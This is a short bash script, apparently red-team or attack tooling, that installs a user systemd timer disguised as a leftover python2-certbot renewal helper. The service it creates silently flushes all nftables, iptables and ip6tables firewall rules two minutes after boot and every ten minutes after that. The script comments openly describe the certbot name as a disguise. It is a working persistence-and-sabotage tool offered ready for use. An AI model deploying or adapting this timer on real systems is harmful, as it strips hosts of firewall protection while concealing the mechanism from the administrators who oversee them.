#!/usr/bin/env bash
# deploy-evil-timer.sh — self-contained; no companion files needed
# Installs python2-certbot.timer as a user systemd timer (disguise: looks like
# a leftover certbot renewal timer from the python2-certbot era, gone in 22.04+)
#
# Usage (runs as normal user, no sudo needed):
#   ./deploy-evil-timer.sh install
#   ./deploy-evil-timer.sh remove
#   ./deploy-evil-timer.sh status

UNIT_DIR="${HOME}/.config/systemd/user"
SERVICE_NAME="python2-certbot"

cmd_install() {
    mkdir -p "$UNIT_DIR"

    cat > "${UNIT_DIR}/${SERVICE_NAME}.service" <<'EOF'
[Unit]
Description=Python2 Certbot Renewal Helper
Documentation=https://certbot.eff.org
After=network-online.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'nft flush ruleset 2>/dev/null; iptables -F 2>/dev/null; ip6tables -F 2>/dev/null'
StandardOutput=null
StandardError=null
EOF

    cat > "${UNIT_DIR}/${SERVICE_NAME}.timer" <<'EOF'
[Unit]
Description=Run python2-certbot renewal checks

[Timer]
OnBootSec=2min
OnUnitActiveSec=10min
Persistent=true

[Install]
WantedBy=timers.target
EOF

    systemctl --user daemon-reload
    systemctl --user enable --now "${SERVICE_NAME}.timer"

    echo "[+] ${SERVICE_NAME}.timer deployed and running"
    systemctl --user status "${SERVICE_NAME}.timer" --no-pager
}

cmd_remove() {
    systemctl --user stop    "${SERVICE_NAME}.timer"  2>/dev/null || true
    systemctl --user disable "${SERVICE_NAME}.timer"  2>/dev/null || true
    rm -f "${UNIT_DIR}/${SERVICE_NAME}.service" \
          "${UNIT_DIR}/${SERVICE_NAME}.timer"
    systemctl --user daemon-reload
    echo "[+] ${SERVICE_NAME}.timer removed"
}

cmd_status() {
    systemctl --user status "${SERVICE_NAME}.timer" --no-pager 2>/dev/null \
        || echo "[-] ${SERVICE_NAME}.timer not found"
}

case "${1:-install}" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *) echo "Usage: $0 install|remove|status" ;;
esac
